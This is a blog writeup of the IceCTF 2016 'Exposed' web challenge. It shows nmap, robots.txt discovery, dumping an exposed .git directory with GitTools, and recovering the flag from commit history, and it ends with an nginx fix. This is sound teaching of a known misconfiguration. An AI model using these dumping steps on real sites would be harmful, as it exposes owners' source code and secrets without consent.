---
title: '#IceCTF 2016 "Exposed" Writeup'
date: '2016-08-27 00:10:00'
layout: post
---
![]({{ site.baseurl }}/forestryio/images/IceCTF.png)

This is part of a few #IceCTF writeups I'm going to put up here. [#IceCTF 2016](https://icec.tf/) was the second CTF i participated. I had a great time and some sleepless nights. Structuring my messy notes helps me to memorize what I learned. Even though I made it only to [295](https://ctftime.org/event/319) (1146.000points), a writeup on some of the challenges I solved may inspire more people to try.

## Stage 2 "Exposed", web, 60pts

> John is pretty happy with himself, he just made his first website (http://exposed.vuln.icec.tf/)! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag?

## My Solution

The mentioned technologies look like a first hint. I start by enumerating all technologies mentioned:

```bash

$ nmap -Pn -sV -p80 exposed.vuln.icec.tf

rDNS record for 104.154.248.13: 13.248.154.104.bc.googleusercontent.com
80/tcp open  http    nginx 1.10.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.16 seconds 

```

Surfing to the url doesn't reveal much apart from a "Hello World" greeting, materialize css framework and nginx/1.10.1 string in the header. Nothing suspicious. Next stop `robots.txt`:

```

User-Agent: *
Disallow: /.git
Disallow: /flag.php

```

So there is the flag.php and a huge giveaway that there might be something wrong with a git installation. `.git` redirects (`301 Moved Permanently`) to: http://exposed.vuln.icec.tf/exposed/git-xdef0x9/ (`404 Not Found`). My first thought was searching for some vulnerable combination of nginx+php+git, maybe some backend/web-admin, but it turned out to be a dead end.

Time to read up on git. [https://wildlyinaccurate.com/a-hackers-guide-to-git/](A Hacker's Guide to Git) is a good start to fresh up my barely existing git skills. Most important part - learn what repositories are:

> A Git repository is really just a simple key-value data store. This is where Git stores, among other things: **Blobs**, which are the most basic data type in Git. Essentially, a blob is just a bunch of bytes; usually a binary representation of a file.
**Tree objects**, which are a bit like directories. Tree objects can contain pointers to blobs and other tree objects.
**Commit objects**, which point to a single tree object, and contain some metadata including the commit author and any parent commits.
**Tag objects**, which point to a single commit object, and contain some metadata.
**References**, which are pointers to a single object (usually a commit or tag object).

Repositories usually look [like this](https://en.internetwache.org/images/posts/git-directorylisting.png):

```bash

$ git init
Initialized empty Git repository in /home/demo/demo-repository/.git/
$ ls -l .git
total 32
drwxrwxr-x 2 demo demo 4096 May 24 20:10 branches
-rw-rw-r-- 1 demo demo 92 May 24 20:10 config
-rw-rw-r-- 1 demo demo 73 May 24 20:10 description
-rw-rw-r-- 1 demo demo 23 May 24 20:10 HEAD
drwxrwxr-x 2 demo demo 4096 May 24 20:10 hooks
drwxrwxr-x 2 demo demo 4096 May 24 20:10 info
drwxrwxr-x 4 demo demo 4096 May 24 20:10 objects
drwxrwxr-x 4 demo demo 4096 May 24 20:10 refs

```

Indeed `http://exposed.vuln.icec.tf/.git/config`  returns the following data:

```

[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true
ignorecase = true
precomposeunicode = true

```

I did not check every file by hand and since this is a well [known](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/) [misconfiguration](http://www.jamiembrown.com/blog/one-in-every-600-websites-has-git-exposed/) [issue](https://laravel-news.com/2015/08/psa-hide-your-gitconfig-directory/) there are at least two mentionable tools for the job:

* **[greedy-git](https://github.com/strawp/greedy-git)**, A tool for analysing remote git files which have been accidentally shared on a web project and
* **[GitTools](https://github.com/internetwache/GitTools)**, A repository with 3 tools for pwn'ing websites with .git repositories available.

I tested both and GitTools turned out to be more useful in this scenario. Using the Dumper to dump the repository:

``` bash

$ ./gitdumper.sh http://exposed.vuln.icec.tf/.git/ exposed/
Creating exposed//.git/
Downloaded: HEAD
Downloaded: objects/info/packs
Downloaded: description
Downloaded: config
Downloaded: COMMIT_EDITMSG
Downloaded: index
Downloaded: packed-refs
Downloaded: refs/heads/master
Downloaded: refs/remotes/origin/HEAD
Downloaded: refs/stash
Downloaded: logs/HEAD
Downloaded: logs/refs/heads/master
Downloaded: logs/refs/remotes/origin/HEAD
Downloaded: info/refs
Downloaded: info/exclude
Downloaded: objects/17/46e11be489319bd8900318874b68304eb05288
Downloaded: objects/63/1503ff237e145c7bade484c44c05a223b51155
Downloaded: objects/00/00000000000000000000000000000000000000

   # lots of /objects/

Downloaded: objects/cd/a8cc0acc8a09153351e43c40f4abeb7a823a03
Downloaded: objects/b5/36a10b5453686bd1dfcc50da3cb156c321fb5f
Downloaded: objects/17/5e312b3d3aeab77ada20ed93d1c9a3f2caf429
```

A few interesting entries in the `.git/logs/HEAD` file (notice that flag gets added, then removed):

```

672c8f636b6db9c79412db177dcca75cde27c82b 60756b184c2d6b8f0247c152d8549562bc14d2d9 James Sigurðarson <jamiees2@gmail.com> 1470865235 +0000	commit: test flag
60756b184c2d6b8f0247c152d8549562bc14d2d9 adf0ebdff8a972f3f6158304323feba4aa1fd482 James Sigurðarson <jamiees2@gmail.com> 1470865293 +0000	commit: flag file
adf0ebdff8a972f3f6158304323feba4aa1fd482 32b31838b757a00f2e296ac198ca7d9cb930e644 James Sigurðarson <jamiees2@gmail.com> 1470865445 +0000	commit (amend): flag file
32b31838b757a00f2e296ac198ca7d9cb930e644 584ae8349fe51e2cb25e11347003c11e92f88c74 James Sigurðarson <jamiees2@gmail.com> 1470865454 +0000	commit (amend): flag route
584ae8349fe51e2cb25e11347003c11e92f88c74 5ea13398f975b53ff30b7ea162b2ec6897a48c68 James Sigurðarson <jamiees2@gmail.com> 1470865511 +0000	commit: remove flag
5ea13398f975b53ff30b7ea162b2ec6897a48c68 4183a0cd7143899e4a5d34f01ce58317fd68921e James Sigurðarson <jamiees2@gmail.com> 1470865669 +0000	commit: add robots.txt

```

A `git checkout -- .` returns the contents of `flag.php`:

```

...
echo @file_get_contents('flag.txt');
...

```

I used the Git Extractor to recover the incomplete repository. `$ ./extractor.sh ../Dumper/exposed /tmp/exposed_repo/` which gave me a few versions of `flag.txt`:

`IceCTF{this_isnt_the_flag_either}` :(

and an earlier version of `flag.php`:

`<?php echo 'IceCTF{not_this_flag}'; ?>` 

`$ git status`, `$ git init`, `$git fsck`, extracting again... Nothing at first glimpse. A detailed [commit log review](https://www.git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History) revealed the flag:

```bash

 $ git log -p          # commit bf55633224c5c76f49d42621ace07aa705ebae6e

```

![]({{ site.baseurl }}/forestryio/images/exposed.png)

## Easy Fix

```
location ~ /\.git {
 deny all;
}

```

